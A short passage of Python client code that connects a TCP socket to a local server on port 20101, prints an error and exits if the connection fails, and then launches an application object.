    #Connect to server
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try: client.connect(("localhost", 20101))
    except OSError:
        print("Could not connect to the server: try updating; try later")
        exit()

    #Start application
    App(client)
